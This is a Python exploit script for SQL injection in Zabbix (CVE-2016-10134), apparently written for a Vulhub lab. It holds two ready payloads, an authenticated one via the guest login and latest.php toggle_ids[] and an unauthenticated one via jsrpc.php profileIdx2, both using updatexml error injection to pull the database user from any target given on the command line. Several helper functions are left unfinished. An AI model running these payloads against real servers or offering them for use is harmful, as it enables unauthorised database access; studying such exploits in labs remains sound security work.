# -*- coding: utf-8 -*-
# @Time    : 2021/12/23
# @Author  : SecCodeCat

from optparse import OptionParser

import re
import sys

import requests

from requests import session

# initialization
ret = dict()
ret['status'] = str()
ret['info'] = list()

ss = session()
ss.headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}

# finish payload1 login
# todo loginwithout
# cd ~/vulhub/zabbix/CVE-2016-10134/
# def get_info():
#     username = "guest"
#     password = ""
#     # 抓包看
#     data = {"sid": "",
#             "form_refresh": "1",
#             "name": username,
#             "password": password,
#             "enter": "Sign+in"}
#
#     ret = ss.get(login_url)
#     print(ret.text)
#
#     # print(ret.cookies)
#     cookie_dict = {i.name: i.value for i in ret.cookies}
#     print(cookie_dict)


# def get_sid(text) -> str:
#     '''获取sid
#     1. Cookie中的zbx_sessionid的后16位字符
#     2. 正则提取页面标签
#     '''
#     sid = re.findall(r"name=\"sid\" value=\"([0-9a-zA-Z]{16})\"", text)
#     print(f"hide sid: {sid}")
#     return sid[0]


def get_payload1(text) -> str:
    payload = re.search(r"\[(.*\))\]", text)
    return payload.group(1)

def get_payload2(text):
    payload = re.search(r"\[(.*\))\]", text)
    # print(payload.group(2))
    print("1----")
    print(payload.groups())
    print(type(payload.groups()))
    # return payload[0]

def get_sql_injection_info(text) -> str:
    sql_injection_info = re.search(r"<\/li><li>(.*)\'\]", text)
    return sql_injection_info.group(1)

def get_sql_injection_info2(text) -> str:
    sql_injection_info = re.findall(r"<\/li><li>(.*)\'\]", text)
    # print(sql_injection_info)
    # print(type(sql_injection_info))
    # return sql_injection_info[0]


def attack_with_login(username, password, target):
    '''login zabbix'''
    login_url = "http://{}/index.php".format(target)

    ret = ss.get(login_url)
    cookie_dict = {i.name: i.value for i in ret.cookies}
    # print(cookie_dict)
    sid = cookie_dict.get('zbx_sessionid')[16:]
    print(f"cookie sid: {sid}")

    # 抓包看
    data = {"sid": sid,  # get_sid(ret.text)
            "form_refresh": "1",
            "name": username,
            "password": password,
            "enter": "Sign+in"}

    r = ss.post(url=login_url, headers=ss.headers, data=data)
    print(r.status_code)

    after_login_dict = {i.name: i.value for i in ret.cookies}
    print(after_login_dict)

    payload1 = f"http://{target}/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)"

    ret = ss.get(url=payload1, headers=ss.headers)
    print(ret.status_code)
    if ret.status_code == 200:
        resp = {
            "payload": get_payload1(ret.text),
            "info": get_sql_injection_info(ret.text)
        }
        print(resp)

    return r.text


def attack_without_login(target):
    payload2 = "http://{}/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)".format(
        target)
    ret = requests.get(payload2, headers=ss.headers)
    print(ret.status_code)
    if ret.status_code == 200:
        # print(ret.text)
        # print(f"[*] payload: {get_payload2(ret.text)}")
        # print(f"[*] info: {get_sql_injection_info2(ret.text)}")
        resp = {
            "payload": get_payload2(ret.text),
            "info": get_sql_injection_info2(ret.text)
        }
        # todo
        # print(resp)


def main():
    usage = "Usage: %prog --target <target ip> --user <user name> --pw <password>"
    parse = OptionParser(usage=usage)
    parse.add_option("-t", '--target', type="string", dest="target", help="server ip:port, e.g. 127.0.0.1:8080")
    parse.add_option("-u", '--user', type="string", dest="username", default="guest", help="login username")
    parse.add_option("-p", '--pw', type="string", dest="password", default="", help="login password")
    parse.add_option("-w", '--without', type="string", dest="without", help="use without login payload")

    options, args = parse.parse_args()

    username = ""
    password = ""

    if not options.target:
        ret['status'] = 'fail'
        ret['info'] = "target empty"
        sys.exit()
    else:
        target = options.target

    if options.without:
        attack_without_login(target)
    else:
        if options.username:
            username = options.username

        if options.password:
            password = options.password

        try:
            attack_with_login(username, password, target)
        except Exception:
            pass


if __name__ == '__main__':
    main()
